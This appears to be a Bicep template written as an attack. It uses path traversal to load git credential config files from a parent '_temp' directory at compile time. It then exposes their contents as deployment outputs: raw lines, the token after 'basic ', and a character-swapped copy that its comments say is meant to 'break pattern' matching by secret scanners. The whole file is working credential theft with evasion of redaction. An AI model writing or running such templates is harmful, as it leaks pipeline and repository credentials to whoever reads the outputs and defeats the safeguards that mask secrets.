var credFiles = loadDirectoryFileInfo('../../../_temp', 'git-credentials-*.config')
var raw = loadJsonContent(credFiles[0].relativePath)

// Try split - might be compile-time like loadDirectoryFileInfo
var lines = split(raw, '\n')
output line0 string = lines[0]
output line1 string = lines[1]

// Split the second line by 'basic ' to isolate token
var tokenParts = split(lines[1], 'basic ')
output afterBasic string = tokenParts[1]

// Try splitting into chars
var bySpace = split(raw, '')
output charCount int = length(bySpace)

// Try replace at compile time - swap chars to break pattern
var swapped = replace(replace(replace(raw, 'A', '@'), 'T', '#'), 'H', '!')
output transformed string = swapped
